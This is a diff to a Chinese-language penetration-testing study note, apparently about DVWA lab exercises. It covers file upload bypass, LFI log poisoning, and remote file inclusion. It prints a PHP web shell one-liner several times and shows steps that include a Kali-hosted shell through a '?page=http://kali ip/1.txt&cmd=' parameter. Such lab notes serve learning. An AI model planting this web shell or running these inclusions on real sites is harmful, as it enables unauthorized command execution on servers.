@@ -800,7 +800,7 @@ Host：123
 <li>DVWA的Upload（low）：<ul>
 <li>1.正常上传一张图片（.jpg,.png等图片文件，图片不能太大）</li>
 <li>2.vi 1.php（<?php echo shell_exec($_GET['cmd']);?>）</li>
-<li>3.可以正常上传，传入参数：?cmd=id</li>
+<li>3.可以正常上传，传入参数：?cmd=id（url中访问1.php）</li>
 <li>▲ 绕过方法：1.上传php 2.修改请求头MAX_SIZE的大小进行重放</li>
 </ul>
 </li>
@@ -1056,7 +1056,7 @@ Host：123
 </ul>
 <blockquote>
 <pre><code>⭐LFI的代码执行
-1.Kali开启nc侦听80端口，发送&lt;?php echo shell_exec($_GET[&apos;cmd&apos;]);?&gt;
+1.Kali开启nc侦听80端口（目标主机），发送&lt;?php echo shell_exec($_GET[&apos;cmd&apos;]);?&gt;
 2.可查看/var/log/apache2/access.log中有记录（服务器apache2日志文件）
 3.查看access.log文件www-data用户是否可以进行执行修改
 4.chmod a+rx access.log（若www-data无权限，假设可修改文件属性）
@@ -1072,13 +1072,13 @@ Host：123
 </ul>
 <blockquote>
 <pre><code>⭐测试远程文件包含
-1.kali本地侦听80端口
+1.kali本地侦听80端口（本机端口）
 2.Web page页?page=http://Kali 地址/a.php（不存在的php页面）
 3.若kali收到请求，则表示测试成功
 ⭐远程文件包含
 1.Kali机子上vi 1.txt
 2.&lt;?php echo shell_exec($_GET[&apos;cmd&apos;]);?&gt;
-3.Kali机子上service apache2 start
+3.Kali机子上service apache2 start（存放在/var/www/html/）
 4.DVWA访问?page=http://kali ip地址/1.txt&amp;cmd=pwd</code></pre></blockquote>
 <ul>
 <li>DVWA的File Inclusion（low）</li>
